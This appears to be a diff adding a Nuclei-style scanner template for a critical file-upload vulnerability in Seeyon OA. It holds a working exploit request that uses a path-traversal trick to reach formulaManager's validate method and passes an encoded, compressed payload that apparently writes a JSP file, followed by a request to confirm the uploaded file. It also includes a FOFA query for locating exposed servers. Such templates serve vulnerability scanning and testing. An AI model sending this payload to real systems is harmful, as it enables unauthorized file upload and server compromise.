@@ -1,0 +1,33 @@
+id: seeyon-oa-formulamanager-file-upload
+
+info:
+  name: Seeyon OA formulaManager File Upload
+  author: zp857
+  severity: critical
+  reference: https://moresec.yuque.com/iixlqz/wnv3e6/hx1eyd
+  tags: seeyon-oa,fileupload
+  metadata:
+    fofa-query: 'app="致远互联-OA" || app="Seeyon-Server"|| app="用友-致远OA" || (server="Seeyon-Server") || (body="/seeyon/USER-DATA/IMAGES/LOGIN/login.gif" || title="用友致远A" || body="/yyoa/" || header="path=/yyoa" || server=="SY8044" || (body="A6-V5企业版" && body="seeyon" && body="seeyonProductId") || (body="/seeyon/common/") || (body="A8-V5企业版" && body="/seeyon/"))'
+
+requests:
+  - raw:
+      - |
+        POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%13uR%5Bo%C2%9B0%14%7E%C3%9E%7E%C2%85%C3%85%0BD%C3%AB%08%C2%A1%24%0A%C2%AB%C3%BA%10+%C2%A5%C2%8C%C2%96D%23%C3%89%C2%A6M%7B0%C3%86%21+..%C3%A6%C2%9A%C2%A8%C3%BF%C2%BD%26%C2%B0%25%C3%92%3AK%C3%96%C2%B9%7D%C3%A7%C3%B3%C3%91%C3%A7%C3%B3%C3%AB%C3%84%C3%AF%C2%B3%3C%29c%C2%B8i%09%C3%A6%C2%BF%C2%80%C3%89%0D%C3%B8%C2%93q%60%C3%92e%C3%B8%02%C3%93%C2%82%C2%BF%C2%A4%C2%97%0D%C3%891%C2%A5a%C2%96vE%C2%B7%C3%88%C3%834%00%04%16%07p%0F8Q%1C%C3%97%C3%98%C2%83%C2%84%C3%901%C3%85%C2%B8%C3%8D%C3%921w%C3%B7%11%C3%B4%C3%A7C%04%2B%28%C2%86%C2%99%C2%B8f-%C3%85%C3%B7%3C%2Cp%0E%C3%88%C3%85%C2%97%19A%C2%8Ak%C3%B0%0EL%C3%A8%C3%B8%3FqG2%C2%9F%C3%8E%C3%85%C2%88%C2%92%C2%86%1B%C3%BD%C2%A5%05%C3%83%08%C3%B4%C2%80%C3%A3%C2%B8%C2%9Bam%C2%92%232H%C3%AB%C3%89%C2%AAd%3D%1E%0A%C3%8F%C2%9C%1EWI%C2%97%C2%93B%C3%B8%C3%B8MBFV%3D%C3%89%C3%A4%C3%A0%27%C3%8B%12%C3%9D%C3%AE%C3%8A%C2%A7%C3%84%C2%A9%3CW%C2%B5%C2%B7%C2%93E%C2%B55%1F%C3%92%C2%9F%C2%AE%15%C3%B8%C3%89%C2%AEEr%5Cy%C2%91%14%3E%C2%BBJkE%C2%8Am%C3%A9%C2%8B%C3%802%C2%9A%17t%C2%BB%C2%98%21%C3%99i%C3%A1%0FM%C3%B2%C3%8C%C2%9D%C2%B4%0E%C2%B2%C3%A0%5C%C3%AB%C2%AE%19%C2%97%C2%BE%C2%AE%29%C3%ABM0q%C2%8E%C3%AC%C2%BA%C2%B4%5D%C3%95%C3%97uu%C3%A2%C3%AB%C3%93%1A%25%0Cg6%C2%A5%C2%AD%7F%C2%9D%21%C3%9D%0A%C3%ACVS%C3%AC%0D%1D%C3%9E%C2%A8%2B%C2%98%3A%C3%B5%2Au%22%C2%86%C2%AB%19.%C3%B6%0D%C3%85%5E%C3%ABj%C3%BFv%C2%A2V%2C%C2%BE%C2%BF%28%0Bh%C2%99%C2%8AIH%C2%91%C2%A8-%C3%9C%C3%A5L10%C3%8A%7C%26%C2%AE%3F%C3%98%5E%C3%97%C3%B7A%C3%82%C2%BFJ%C3%B6mC%C3%90%C3%B7%C3%B6%C2%810%10%C2%8A%C2%BD%C3%95%C3%8A%C3%BD%C2%9E%11%C2%9C%C2%85%1F%C3%9Dp%C3%9B%C3%8D%C3%83%C3%A7%C3%B9%C3%B5%C3%87%5C%C3%BF%C2%ADx%0E%C3%A2T%C2%B8%26%C3%BF%1F%16%C3%85%19%C3%85l%C2%B0%C3%97%C2%BBn%C3%B7%C2%98%C3%A3%C3%A3%3D%C2%A0%05%2CB%04%C2%9A%C2%A6%11F%27%C3%BE%C2%95-%24%5B%C3%8ASg%C2%8B%C2%BC%C3%84%C3%BC%C3%AF7%C3%92%C2%9Fq%C3%90%C3%8B%02%00%00
+
+      - |
+        GET /seeyon/zp858.jspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'zp857857'
+
+      - type: status
+        status:
+          - 200
